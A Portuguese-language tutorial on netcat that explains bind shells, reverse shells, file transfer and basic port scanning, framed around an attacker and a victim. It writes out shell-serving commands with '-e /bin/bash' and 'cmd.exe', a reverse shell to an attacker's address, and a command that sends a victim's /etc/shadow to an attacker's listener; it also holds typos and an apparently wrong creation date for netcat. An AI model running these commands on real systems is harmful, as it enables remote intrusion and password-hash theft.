<img src="netcat.jpeg">

# Bind e Reverse Shell com Netcat

## Introdução ao Netcat

Netcat é um utilitário de rede usado para ler e gravar conexões TCP e UDP. Foi criado em 2004 pelo desenvolvedor conhecido como Hobbit, e é uma ferramenta simples, porém com que pode utilizada em vários cenários. Ele é considerado um "canivete suiço TCP/IP". Foi desenvolvido para ser uma ferramenta de "back-end", que se utiliza diretamente da linha de comando. Com ele você pode você pode se conectar a qualquer máquina (estação) de uma rede e até mesmo de fora da sua rede, que também tenha o netcat executando. Essa estação pode atuar como cliente ou servidor. Você pode também se conectar por meio de outros serviços, como por exemplo o SMTP. O netcat pode ser utilizado para uma série de tarefas de manutenção, desenvolvimento, levantamento de rede, etc.. Netcat pode ser usado de várias foramas para atender aos mais diversificados propósitos, limitado apenas a imaginação de quem o esta utilizando, e ao conhecimento TCP/IP do usuário.

## Bind Shell

<img src="bind_reverse.png">
<p></p>

Um shell de ligação direta utilizando o bind ligando o invasor diretamente ao endereço de um host remoto. 
Quando configuramos um shell de ligação, estamos dizendo á estação remota para servir um shell para nós através da porta TCP, configurar um "ouvinte" - que no caso seria o servidor, nessa porta, e quando fizermos a conexão com essa porta execute um sheell e nevie a saida de texto pela rede pra nós. Dessa forma conseguimos executar um shell remoto, como se estivessemos na estação local. Isso é muito perigoso, especialmente se o usuário remoto tiver permissões administrativas

Configurar uma "escuta" dentro desse cenário é simples. POdemos pegar uma porta aleatório, seguindo o exemplo abaixo:

    nc -nvlp 1000 


As opções aqui estão condensadas para facilitar o uso. Os mesmos comandos podem ser escritos de outra maneira.

    nc -n -v -l -p 1000

A opção -n especifica que a busca será por meio de ip, e não haverá resolução de dns. Isso deixa a consulta mais ágil. A opção -v significa modo verbose, ou seja, e impresso na tela tudo que estiver sendo consultado e executado.

Assim que a estação remota estiver em modo escuta, podemos usar nossa estação de ataque para se conectar ao host. Lembrando que a porta escolhida nesse exemplo foi a 1000. Supondo que o ip remoto seja 192.168.10.130, faremos assim:

    nc 192.168.10.130 1000

Nesse exemplo é possível fazer uma comunicação via chat por exemplo. Escrevendo uma mensagem em uma das estações, ele é impresso na outra estação simultaneamente.

Para fazer uma conexão com sheel reverso, basta colocarmos o parametro -e seguido do /bin/bash na estação que estará "escutando" a conexão.

    nc -nvlp 1000 -e /bin/bash (na estação de escuta)

ou

    nc -nvlp 1000 -e cmd.exe

Na estação que fará a conexão, basta repetir o comando anterior:

    nc 192.168.10.130 1000

você vai observer que estará interagindo com o shell da estação que está escutando.

## Reverse Shell

Consiste em realizar um comando do netcat do cliente que vai conectar ao servidor do atacante que escutará em uma porta específica, aguardando a conexão.

Para fazer seus testes, você poderá usar o ip de sua rede mesmo, ou fazer um direcionamento DMZ de DNS dinamico, como DynDNS ou No-ip.

Usando uma rede local como exemplo:

    nc 192.168.10.100 1000 -e /bin/bash

Nesse exemplo a vitima esbaleceu uma conexão servidor netcat do atacante e deixou disponível o shell da vitima.

    nc -nlp 1000 -v

Todos os comandos dados a partir de agora, estará interagindo com o shell da vítima.

## Transferir arquivos via netcat

Para transferir arquivos entre hosts rodando netcat é bem simples:

1 - Prepara o atacante pra receber os dados:

    nc -vnlp 1500 > shadow-vitima.txt

2 - Atraés do shell da vitima, que pode ter sido disponibilizado de alguma forma:

    nc 192.168.100.110 < /etc/shadow

3 - Aguarde a transferência e depois verifique o conteúdo do arquivo:

    cat shadow-vitima.txt

## Netcat Port Scanner

COm o netcat é possível fazer também escaneamento de portas. Embora ele não seja tão completo pra isso como o nmap, ele pode muito bem ser usado para isso. para tal podemos dar o seguinte comando:

    nc -vzn 192.168.10.100 21

No caso a porta qu está sendo escaneada é a porta 21 (ftp)







